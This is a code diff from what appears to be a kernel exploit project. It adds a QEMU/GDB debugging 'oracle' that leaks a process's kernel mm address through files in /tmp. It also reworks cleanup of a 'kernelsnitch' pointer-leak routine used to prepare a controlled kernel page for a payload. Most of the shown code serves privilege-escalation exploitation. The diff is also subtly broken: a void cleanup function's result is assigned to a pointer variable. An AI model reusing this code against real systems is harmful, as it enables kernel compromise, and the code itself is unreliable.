@@ -480,9 +480,18 @@ static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 }
 #endif
 
+static void cleanup_mm_search_state(void) {
+  if (ks) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+  }
+}
+
 uintptr_t cleanup_kernelsnitch(void) {
-  uintptr_t leaked = kernelsnitch_cleanup(ks);
-  ks = NULL;
+  if (!ks) {
+    return (uintptr_t)-1;
+  }
+  uintptr_t leaked = cleanup_mm_search_state();
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   return canonicalize_kernelsnitch_pointer(leaked);
 #else
@@ -777,6 +786,115 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   }
   return 0;
 }
+
+#if defined(QEMU_GDB_MM_ORACLE) && QEMU_GDB_MM_ORACLE
+#define QEMU_MM_ORACLE_REQUEST "/tmp/rmg-mm-oracle.request"
+#define QEMU_MM_ORACLE_ARMED "/tmp/rmg-mm-oracle.armed"
+#define QEMU_MM_ORACLE_RESULT "/tmp/rmg-mm-oracle.result"
+#define QEMU_MM_ORACLE_TIMEOUT_MS 1200000ULL
+
+static int qemu_mm_gdb_wait_for_file(const char *path) {
+  for (unsigned long long waited = 0;
+       waited < QEMU_MM_ORACLE_TIMEOUT_MS;
+       waited += 10) {
+    if (access(path, R_OK) == 0) {
+      return 1;
+    }
+    usleep(10000);
+  }
+  return 0;
+}
+
+int qemu_mm_gdb_oracle_leak(uintptr_t *mm_out, int *memfd_out) {
+  pid_t child;
+  int fd;
+  FILE *request;
+  FILE *result;
+  unsigned long long parsed_mm = 0;
+  int parsed_pid = 0;
+
+  if (!mm_out || !memfd_out) {
+    return 0;
+  }
+
+  *mm_out = 0;
+  *memfd_out = -1;
+
+  unlink(QEMU_MM_ORACLE_REQUEST);
+  unlink(QEMU_MM_ORACLE_ARMED);
+  unlink(QEMU_MM_ORACLE_RESULT);
+
+  request = fopen(QEMU_MM_ORACLE_REQUEST, "w");
+  if (!request) {
+    pr_error("qemu gdb oracle request open failed errno=%d\n", errno);
+    return 0;
+  }
+  fprintf(request, "pid=%d\n", getpid());
+  if (fclose(request) != 0) {
+    pr_error("qemu gdb oracle request close failed errno=%d\n", errno);
+    return 0;
+  }
+
+  pr_info("qemu gdb oracle request pid=%d\n", getpid());
+
+  if (!qemu_mm_gdb_wait_for_file(QEMU_MM_ORACLE_ARMED)) {
+    pr_error("qemu gdb oracle arm timeout pid=%d\n", getpid());
+    unlink(QEMU_MM_ORACLE_REQUEST);
+    return 0;
+  }
+
+  child = clone_child();
+  fd = open_memfd(child);
+  pr_info("qemu gdb oracle clone pid=%d child=%d memfd=%d\n",
+          getpid(), child, fd);
+
+  if (!qemu_mm_gdb_wait_for_file(QEMU_MM_ORACLE_RESULT)) {
+    pr_error("qemu gdb oracle result timeout pid=%d child=%d\n",
+             getpid(), child);
+    close(fd);
+    kill_child(child);
+    unlink(QEMU_MM_ORACLE_REQUEST);
+    unlink(QEMU_MM_ORACLE_ARMED);
+    return 0;
+  }
+
+  result = fopen(QEMU_MM_ORACLE_RESULT, "r");
+  if (!result) {
+    pr_error("qemu gdb oracle result open failed errno=%d\n", errno);
+    close(fd);
+    kill_child(child);
+    return 0;
+  }
+
+  if (fscanf(result, "pid=%d mm=%llx",
+             &parsed_pid, &parsed_mm) != 2 ||
+      parsed_pid != (int)getpid() ||
+      parsed_mm == 0) {
+    fclose(result);
+    pr_error("qemu gdb oracle invalid result pid=%d expected=%d\n",
+             parsed_pid, getpid());
+    close(fd);
+    kill_child(child);
+    unlink(QEMU_MM_ORACLE_REQUEST);
+    unlink(QEMU_MM_ORACLE_ARMED);
+    unlink(QEMU_MM_ORACLE_RESULT);
+    return 0;
+  }
+  fclose(result);
+
+  kill_child(child);
+  *mm_out = (uintptr_t)parsed_mm;
+  *memfd_out = fd;
+
+  pr_info("qemu gdb oracle captured mm=%016zx memfd=%d pid=%d\n",
+          *mm_out, fd, getpid());
+
+  unlink(QEMU_MM_ORACLE_REQUEST);
+  unlink(QEMU_MM_ORACLE_ARMED);
+  unlink(QEMU_MM_ORACLE_RESULT);
+  return 1;
+}
+#endif
 
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
@@ -2036,8 +2154,7 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static void cleanup_failed_kernel_page(const char *reason) {
   pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
-  kernelsnitch_cleanup(ks);
-  ks = NULL;
+  cleanup_mm_search_state();
   pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
   pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
           reason, prepare_ctx.mm_cnt);
@@ -2506,8 +2623,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
           payload_mode, base);
 #endif
-  kernelsnitch_cleanup(ks);
-  ks = NULL;
+  cleanup_mm_search_state();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
           payload_mode);
